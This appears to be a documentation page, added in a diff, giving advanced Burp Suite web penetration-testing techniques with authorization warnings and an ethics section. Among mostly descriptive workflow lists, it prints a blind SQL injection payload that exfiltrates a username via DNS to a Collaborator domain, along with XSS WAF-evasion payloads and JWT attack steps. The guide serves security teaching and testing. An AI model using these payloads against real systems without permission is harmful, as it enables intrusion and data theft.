@@ -1,0 +1,755 @@
+---
+title: Advanced Burp Suite Techniques
+description: Comprehensive guide to advanced techniques and workflows for Burp Suite Professional
+---
+
+import { Accordion, AccordionItem, AccordionContent, AccordionTrigger } from "@/components/ui/accordion"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Callout } from "@/components/markdown/callout"
+import { Steps } from "@/components/markdown/steps"
+
+# Advanced Burp Suite Techniques
+
+This guide covers advanced techniques and workflows for experienced Burp Suite users. These approaches will help you maximize the effectiveness of your web application security testing.
+
+<Callout type="info">
+  Many of these advanced techniques require Burp Suite Professional Edition. Features that are exclusive to the Professional Edition are marked accordingly.
+</Callout>
+
+## Advanced Testing Workflows
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="comprehensive-methodology">
+    <AccordionTrigger>Comprehensive Testing Methodology</AccordionTrigger>
+    <AccordionContent>
+      A structured approach to thorough application testing:
+      
+      1. **Reconnaissance and mapping**
+         - Use Target tool to build a complete site map
+         - Identify all entry points and functionality
+         - Document application architecture and technologies
+      
+      2. **Passive analysis**
+         - Enable passive scanning
+         - Review HTTP history for interesting patterns
+         - Identify potential vulnerabilities without active testing
+      
+      3. **Authentication and session testing**
+         - Analyze authentication mechanisms
+         - Test session management
+         - Look for logic flaws in user flows
+      
+      4. **Active vulnerability scanning**
+         - Run targeted active scans on critical functionality
+         - Prioritize high-risk areas
+         - Analyze scan results and verify findings
+      
+      5. **Manual testing**
+         - Test for business logic vulnerabilities
+         - Perform manual injection testing
+         - Verify scanner findings
+      
+      6. **Advanced exploitation**
+         - Chain multiple vulnerabilities
+         - Develop custom exploits for confirmed issues
+         - Document impact and attack paths
+      
+      7. **Reporting and remediation**
+         - Prepare detailed vulnerability reports
+         - Provide clear remediation guidance
+         - Verify fixes when implemented
+      
+      This methodical approach ensures comprehensive coverage while efficiently using time and resources.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="targeted-testing">
+    <AccordionTrigger>Targeted Testing Strategies</AccordionTrigger>
+    <AccordionContent>
+      Focused approaches for specific testing scenarios:
+      
+      **API Security Testing:**
+      - Map all API endpoints using Proxy history
+      - Test for improper authorization
+      - Check for rate limiting and resource exhaustion vulnerabilities
+      - Verify proper input validation
+      - Test for information disclosure in error responses
+      
+      **Single-Page Application (SPA) Testing:**
+      - Analyze client-side JavaScript
+      - Test client-side routing security
+      - Examine state management for vulnerabilities
+      - Test API endpoints used by the SPA
+      - Look for sensitive data exposure in browser storage
+      
+      **Mobile API Backend Testing:**
+      - Configure Burp for mobile traffic interception
+      - Test for mobile-specific vulnerabilities
+      - Verify API endpoint security
+      - Check for hardcoded secrets
+      - Test certificate pinning bypass techniques
+      
+      **Microservices Architecture Testing:**
+      - Map service interactions
+      - Test inter-service authentication
+      - Look for authorization bypasses between services
+      - Test for service-specific vulnerabilities
+      - Verify proper isolation between services
+      
+      Targeted strategies help focus testing efforts on the most relevant security aspects for each application type.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Advanced Tool Configurations
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="advanced-scanner">
+    <AccordionTrigger>Advanced Scanner Configuration (Professional)</AccordionTrigger>
+    <AccordionContent>
+      Maximize the effectiveness of automated scanning:
+      
+      1. **Custom scan configurations**
+         - Create specialized configurations for different application types
+         - Optimize scan checks for specific technologies
+         - Balance thoroughness with performance
+      
+      2. **Advanced crawling**
+         - Configure custom form submission values
+         - Set up application login macros
+         - Define complex crawl strategies
+      
+      3. **Custom insertion points**
+         - Define additional insertion points for testing
+         - Configure custom parameter locations
+         - Add headers and cookies as insertion points
+      
+      4. **Resource pool management**
+         - Create multiple resource pools for different targets
+         - Configure concurrent request limits
+         - Set up throttling for sensitive applications
+      
+      5. **False positive reduction**
+         - Configure attack payload selection
+         - Adjust match/replacement rules
+         - Fine-tune vulnerability detection thresholds
+      
+      Example custom scan configuration for a Java application:
+      ```
+      Audit checks: All except Node.js and PHP-specific checks
+      Crawl strategy: Form submission with custom values
+      Resource pool: Maximum 5 concurrent requests, 100ms throttle
+      Insertion points: Standard + custom headers (X-CSRF-Token, X-API-Key)
+      ```
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="advanced-intruder">
+    <AccordionTrigger>Advanced Intruder Techniques</AccordionTrigger>
+    <AccordionContent>
+      Sophisticated attack configurations for complex testing scenarios:
+      
+      1. **Custom payload processing**
+         - Use payload processing rules to transform payloads
+         - Chain multiple rules for complex transformations
+         - Create rules for encoding, hashing, and other operations
+      
+      2. **Advanced payload generation**
+         - Create custom payload generators
+         - Use recursive grep payloads
+         - Implement number and character substitution
+      
+      3. **Multi-step attacks**
+         - Extract values from responses for use in subsequent requests
+         - Chain attacks using macros and session handling rules
+         - Automate complex attack sequences
+      
+      4. **Resource pool optimization**
+         - Configure resource pools for different attack types
+         - Balance speed and server impact
+         - Set appropriate timeouts and retries
+      
+      5. **Custom match and extract rules**
+         - Create sophisticated pattern matching rules
+         - Extract specific data from responses
+         - Define complex success/failure conditions
+      
+      Example advanced payload processing:
+      ```
+      1. Add prefix: "user_"
+      2. Base64-encode
+      3. URL-encode
+      4. Add custom header with result
+      ```
+      
+      These advanced techniques allow for highly customized and powerful automated testing.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="advanced-macros">
+    <AccordionTrigger>Advanced Session Handling with Macros</AccordionTrigger>
+    <AccordionContent>
+      Create sophisticated session handling rules for complex applications:
+      
+      1. **Multi-step authentication macros**
+         - Record complex login sequences
+         - Handle multi-factor authentication
+         - Process CSRF tokens and other dynamic values
+      
+      2. **Conditional macro execution**
+         - Create rules that run only under specific conditions
+         - Check for session timeout indicators
+         - Implement fallback mechanisms
+      
+      3. **Value extraction and reuse**
+         - Extract values from responses
+         - Use extracted values in subsequent requests
+         - Chain multiple extraction rules
+      
+      4. **Custom parameter handling**
+         - Update specific parameters based on previous responses
+         - Handle dynamic session identifiers
+         - Process application-specific tokens
+      
+      5. **Integration with extensions**
+         - Use extensions to enhance macro capabilities
+         - Implement custom logic for complex scenarios
+         - Handle non-standard authentication mechanisms
+      
+      Example macro for an OAuth 2.0 flow:
+      ```
+      1. Request login page
+      2. Extract CSRF token
+      3. Submit login form with credentials and token
+      4. Extract authorization code
+      5. Exchange code for access token
+      6. Store access token for use in subsequent requests
+      ```
+      
+      Advanced session handling enables testing of complex applications with sophisticated authentication and session management.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Advanced Extension Development
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="extension-development">
+    <AccordionTrigger>Creating Custom Extensions (Professional)</AccordionTrigger>
+    <AccordionContent>
+      Develop custom extensions to enhance Burp Suite's capabilities:
+      
+      1. **Extension development environment setup**
+         - Configure Java or Python development environment
+         - Set up appropriate libraries and dependencies
+         - Prepare testing infrastructure
+      
+      2. **Burp Extender API**
+         - Understand core interfaces:
+           - `IBurpExtender`
+           - `IHttpListener`
+           - `IScannerCheck`
+           - `IIntruderPayloadGenerator`
+           - `ISessionHandlingAction`
+         - Implement required interfaces for your extension
+      
+      3. **Common extension types**
+         - Custom scanner checks
+         - Specialized payload generators
+         - Protocol handlers
+         - UI enhancements
+         - Reporting tools
+      
+      4. **Best practices**
+         - Handle exceptions properly
+         - Implement efficient algorithms
+         - Add appropriate logging
+         - Create user-friendly configuration UI
+         - Document your extension thoroughly
+      
+      5. **Testing and deployment**
+         - Test extensions thoroughly before deployment
+         - Package extensions properly
+         - Consider submitting to the BApp Store
+      
+      Example extension skeleton (Java):
+      ```java
+      package burp;
+      
+      public class BurpExtender implements IBurpExtender, IHttpListener {
+          private IBurpExtenderCallbacks callbacks;
+          private IExtensionHelpers helpers;
+          
+          @Override
+          public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
+              this.callbacks = callbacks;
+              this.helpers = callbacks.getHelpers();
+              
+              callbacks.setExtensionName("My Custom Extension");
+              callbacks.registerHttpListener(this);
+          }
+          
+          @Override
+          public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
+              // Custom processing logic here
+          }
+      }
+      ```
+      
+      Custom extensions allow you to tailor Burp Suite to your specific testing needs and workflows.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="extension-use-cases">
+    <AccordionTrigger>Advanced Extension Use Cases</AccordionTrigger>
+    <AccordionContent>
+      Specialized extensions for specific testing scenarios:
+      
+      1. **Custom vulnerability detection**
+         - Implement checks for application-specific vulnerabilities
+         - Create detectors for emerging security issues
+         - Build specialized scanners for unique technologies
+      
+      2. **Protocol handlers**
+         - Develop extensions for non-HTTP protocols
+         - Create custom parsers for proprietary formats
+         - Handle binary protocols and serialized data
+      
+      3. **Authentication helpers**
+         - Build extensions for complex authentication schemes
+         - Implement OAuth, SAML, or JWT handlers
+         - Create helpers for custom authentication mechanisms
+      
+      4. **Workflow automation**
+         - Automate repetitive testing tasks
+         - Create extensions for batch operations
+         - Build test case generators
+      
+      5. **Integration with external tools**
+         - Connect Burp with other security tools
+         - Implement data exchange with external systems
+         - Create bridges to custom analysis engines
+      
+      Example use cases:
+      
+      **JWT Analysis Extension:**
+      - Automatically detect JWT tokens in traffic
+      - Decode and analyze token structure and claims
+      - Identify weak signing algorithms
+      - Test for common JWT vulnerabilities
+      
+      **GraphQL Security Extension:**
+      - Parse and validate GraphQL queries
+      - Detect introspection and information disclosure
+      - Test for authorization issues in resolvers
+      - Generate security-focused test queries
+      
+      **Custom Report Generator:**
+      - Create tailored vulnerability reports
+      - Implement custom severity ratings
+      - Generate client-specific documentation
+      - Integrate with issue tracking systems
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Advanced Testing Techniques
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="collaborator">
+    <AccordionTrigger>Advanced Collaborator Techniques (Professional)</AccordionTrigger>
+    <AccordionContent>
+      Leverage Burp Collaborator for sophisticated out-of-band testing:
+      
+      1. **Custom Collaborator payloads**
+         - Generate specialized payloads for specific vulnerabilities
+         - Embed Collaborator domains in different contexts
+         - Create payloads for various injection points
+      
+      2. **Advanced OAST (Out-of-band Application Security Testing)**
+         - Test for blind vulnerabilities:
+           - Blind SQL injection
+           - Blind XXE
+           - Blind SSRF
+           - Blind command injection
+         - Extract data via DNS or HTTP callbacks
+      
+      3. **Data exfiltration techniques**
+         - Use DNS subdomains for data extraction
+         - Encode sensitive data in callback requests
+         - Implement multi-stage exfiltration for larger datasets
+      
+      4. **Private Collaborator deployment**
+         - Set up your own Collaborator server
+         - Configure custom domains
+         - Implement secure logging and monitoring
+      
+      5. **Integration with other tools**
+         - Use Collaborator with custom extensions
+         - Combine with Intruder for automated testing
+         - Integrate with custom payload generators
+      
+      Example advanced Collaborator payload for blind SQL injection:
+      ```sql
+      ' UNION SELECT LOAD_FILE\(CONCAT\('\\\\',
+      \(SELECT HEX\(username\) FROM users LIMIT 1\),
+      '.collaborator-domain.burpcollaborator.net\\share\\file'\)\) -- 
+      ```
+      
+      This payload attempts to exfiltrate a username via DNS, encoding it as a subdomain in the Collaborator request.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="automation">
+    <AccordionTrigger>Automation and CI/CD Integration</AccordionTrigger>
+    <AccordionContent>
+      Integrate Burp Suite into automated testing workflows:
+      
+      1. **Burp Suite Enterprise**
+         - Deploy Burp Suite Enterprise for CI/CD integration
+         - Configure scheduled and triggered scans
+         - Set up scan configurations and policies
+         - Implement result filtering and reporting
+      
+      2. **REST API usage (Professional)**
+         - Leverage the Burp REST API for automation
+         - Create scripts to control Burp programmatically
+         - Integrate with custom tooling and workflows
+      
+      3. **Command-line automation**
+         - Use Burp's command-line interface
+         - Create scripts for headless operation
+         - Implement custom scan workflows
+      
+      4. **Integration approaches**
+         - Pre-deployment security gates
+         - Scheduled scans of staging environments
+         - Post-deployment verification
+         - Continuous monitoring
+      
+      5. **Results processing**
+         - Parse and filter scan results
+         - Set acceptable thresholds
+         - Generate reports and notifications
+         - Track security metrics over time
+      
+      Example command-line scan:
+      ```bash
+      java -jar burpsuite_pro.jar --project-file=project.burp --config-file=config.json --user-config-file=user.json
+      ```
+      
+      Automation ensures security testing is performed consistently throughout the development lifecycle, identifying vulnerabilities earlier when they're less expensive to fix.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Advanced Attack Techniques
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="advanced-attacks">
+    <AccordionTrigger>Sophisticated Attack Chaining</AccordionTrigger>
+    <AccordionContent>
+      Combine multiple vulnerabilities for maximum impact:
+      
+      1. **Vulnerability chaining**
+         - Identify complementary vulnerabilities
+         - Develop exploitation strategies
+         - Chain multiple issues for greater impact
+      
+      2. **Common attack chains**
+         - CSRF + XSS
+         - Information disclosure + authentication bypass
+         - SQLi + file upload
+         - SSRF + internal service exploitation
+      
+      3. **Privilege escalation chains**
+         - Horizontal to vertical privilege escalation
+         - Session manipulation + access control bypass
+         - Account takeover techniques
+      
+      4. **Infrastructure attack paths**
+         - External to internal network pivoting
+         - Cloud service exploitation chains
+         - Container escape techniques
+      
+      Example attack chain:
+      ```
+      1. Identify information disclosure in error messages
+      2. Extract internal hostnames and paths
+      3. Discover SSRF vulnerability
+      4. Use SSRF to access internal services
+      5. Exploit weak internal service
+      6. Escalate privileges
+      ```
+      
+      Understanding how to chain vulnerabilities demonstrates the true security impact and helps prioritize remediation efforts.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="evasion">
+    <AccordionTrigger>WAF and Defense Evasion Techniques</AccordionTrigger>
+    <AccordionContent>
+      <Callout type="warning">
+        These techniques should only be used in authorized testing scenarios with proper permission. Attempting to evade security controls without authorization may violate laws and regulations.
+      </Callout>
+      
+      Strategies for testing applications protected by security controls:
+      
+      1. **WAF bypass techniques**
+         - Identify WAF signatures and triggers
+         - Use encoding and obfuscation
+         - Implement alternative payload formats
+         - Leverage HTTP protocol quirks
+      
+      2. **Common evasion methods**
+         - Mixed case encoding
+         - Alternative character representations
+         - Comment injection
+         - Whitespace manipulation
+         - Protocol-level evasion
+      
+      3. **Match and replace rules for evasion**
+         - Create rules to automatically modify payloads
+         - Implement context-aware transformations
+         - Chain multiple evasion techniques
+      
+      4. **Testing WAF effectiveness**
+         - Methodically probe WAF rules
+         - Document bypass techniques
+         - Assess WAF coverage and gaps
+      
+      5. **Reporting and remediation**
+         - Document successful evasion techniques
+         - Recommend WAF improvements
+         - Suggest defense-in-depth strategies
+      
+      Example evasion techniques for XSS:
+      ```
+      Standard: <script>alert\(1\)</script>
+      Evasion 1: <sCrIpT>alert\(1\)</sCrIpT>
+      Evasion 2: <script>al\u0065rt\(1\)</script>
+      Evasion 3: <img src=x onerror="alert\(1\)">
+      Evasion 4: <svg/onload=alert\(1\)>
+      ```
+      
+      Understanding evasion techniques helps security teams improve their defensive measures and build more robust protections.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Advanced Analysis Techniques
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="traffic-analysis">
+    <AccordionTrigger>Advanced Traffic Analysis</AccordionTrigger>
+    <AccordionContent>
+      Sophisticated techniques for analyzing application traffic:
+      
+      1. **Pattern identification**
+         - Identify patterns in request/response pairs
+         - Detect encoding schemes and transformations
+         - Recognize data formats and structures
+      
+      2. **Comparative analysis**
+         - Use Comparer for detailed difference analysis
+         - Compare responses across different user roles
+         - Identify subtle variations in application behavior
+      
+      3. **Timing analysis**
+         - Detect time-based vulnerabilities
+         - Identify performance patterns
+         - Recognize timing side-channels
+      
+      4. **State analysis**
+         - Map application state transitions
+         - Identify state-dependent vulnerabilities
+         - Test for race conditions and concurrency issues
+      
+      5. **Protocol analysis**
+         - Analyze custom protocols built on HTTP
+         - Reverse-engineer proprietary formats
+         - Identify weaknesses in protocol implementation
+      
+      Example analysis workflow:
+      ```
+      1. Capture baseline traffic for normal operation
+      2. Perform the same actions with different user roles
+      3. Compare responses using Burp Comparer
+      4. Identify information leakage or access control issues
+      5. Document findings and develop exploitation proof
+      ```
+      
+      Advanced analysis techniques help uncover subtle vulnerabilities that automated tools might miss.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="crypto-analysis">
+    <AccordionTrigger>Cryptographic Analysis</AccordionTrigger>
+    <AccordionContent>
+      Techniques for analyzing and testing cryptographic implementations:
+      
+      1. **Token analysis**
+         - Use Sequencer to analyze token randomness
+         - Test session token generation
+         - Analyze CSRF token implementation
+      
+      2. **Encryption analysis**
+         - Identify encryption algorithms and modes
+         - Test for padding oracle vulnerabilities
+         - Check for weak cipher implementations
+      
+      3. **JWT token testing**
+         - Analyze JWT structure and claims
+         - Test signature verification
+         - Check for algorithm confusion issues
+         - Attempt key disclosure attacks
+      
+      4. **TLS/SSL testing**
+         - Analyze certificate usage
+         - Test for protocol downgrade vulnerabilities
+         - Check cipher suite configuration
+      
+      5. **Custom cryptographic implementations**
+         - Identify homegrown crypto
+         - Test for common implementation flaws
+         - Look for key management issues
+      
+      Example JWT attack workflow:
+      ```
+      1. Capture JWT token from authentication
+      2. Decode and analyze token structure
+      3. Test for "none" algorithm acceptance
+      4. Attempt signature stripping
+      5. Test for weak key vulnerabilities
+      6. Check for missing signature verification
+      ```
+      
+      Cryptographic analysis helps identify subtle security issues in authentication and data protection mechanisms.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Best Practices for Advanced Users
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="optimization">
+    <AccordionTrigger>Performance Optimization</AccordionTrigger>
+    <AccordionContent>
+      Maximize Burp Suite performance for complex testing scenarios:
+      
+      1. **System resource allocation**
+         - Allocate sufficient memory to Burp Suite
+         - Configure appropriate Java options
+         - Optimize CPU usage
+      
+      2. **Project management**
+         - Use separate projects for different targets
+         - Regularly save and backup projects
+         - Archive completed projects
+      
+      3. **Scope optimization**
+         - Define precise target scope
+         - Exclude unnecessary hosts and paths
+         - Use appropriate file extension handling
+      
+      4. **Tool-specific optimizations**
+         - Configure Scanner resource pools
+         - Optimize Intruder thread count
+         - Manage Proxy history size
+      
+      5. **Extension management**
+         - Only load necessary extensions
+         - Disable resource-intensive extensions when not needed
+         - Monitor extension performance
+      
+      Example Java options for performance:
+      ```
+      java -Xmx4G -Xms2G -jar burpsuite_pro.jar
+      ```
+      
+      Proper performance optimization ensures efficient testing even for large and complex applications.
+    </AccordionContent>
+  </AccordionItem>
+  
+  <AccordionItem value="team-collaboration">
+    <AccordionTrigger>Team Collaboration</AccordionTrigger>
+    <AccordionContent>
+      Effective collaboration techniques for team-based testing:
+      
+      1. **Project sharing**
+         - Share Burp project files
+         - Establish naming conventions
+         - Implement version control for projects
+      
+      2. **Task distribution**
+         - Assign specific application areas to team members
+         - Coordinate testing efforts
+         - Avoid duplicate work
+      
+      3. **Finding documentation**
+         - Use consistent reporting formats
+         - Document vulnerabilities thoroughly
+         - Include clear reproduction steps
+      
+      4. **Knowledge sharing**
+         - Share custom configurations
+         - Document effective testing techniques
+         - Create reusable test cases
+      
+      5. **Integration with team tools**
+         - Connect with issue tracking systems
+         - Integrate with collaboration platforms
+         - Establish reporting workflows
+      
+      Effective team collaboration enhances testing efficiency and ensures comprehensive coverage of complex applications.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Ethical Considerations
+
+<Callout type="warning">
+  Always conduct security testing ethically and legally. Only test applications you own or have explicit permission to test. Unauthorized testing may violate laws and regulations.
+</Callout>
+
+<Accordion type="single" collapsible>
+  <AccordionItem value="ethical-testing">
+    <AccordionTrigger>Ethical Testing Guidelines</AccordionTrigger>
+    <AccordionContent>
+      Principles for ethical security testing:
+      
+      1. **Obtain proper authorization**
+         - Get explicit written permission before testing
+         - Understand the scope and limitations
+         - Respect testing boundaries
+      
+      2. **Minimize impact**
+         - Avoid denial of service conditions
+         - Limit testing of sensitive functionality
+         - Consider business hours and peak times
+      
+      3. **Data handling**
+         - Handle discovered data responsibly
+         - Do not access, copy, or exfiltrate sensitive data
+         - Report data exposure issues immediately
+      
+      4. **Responsible disclosure**
+         - Follow responsible disclosure practices
+         - Provide clear remediation guidance
+         - Allow reasonable time for fixes
+      
+      5. **Legal considerations**
+         - Understand relevant laws and regulations
+         - Comply with contractual obligations
+         - Document all testing activities
+      
+      Ethical testing protects both the tester and the organization while ensuring security improvements can be implemented effectively.
+    </AccordionContent>
+  </AccordionItem>
+</Accordion>
+
+## Next Steps
+
+- [Burp Suite Tool Documentation](/docs/burp-suite/tools)
+- [Web Application Security Best Practices](/docs/web-security/best-practices)
+- [OWASP Top 10 Vulnerabilities](/docs/web-security/owasp-top-10)
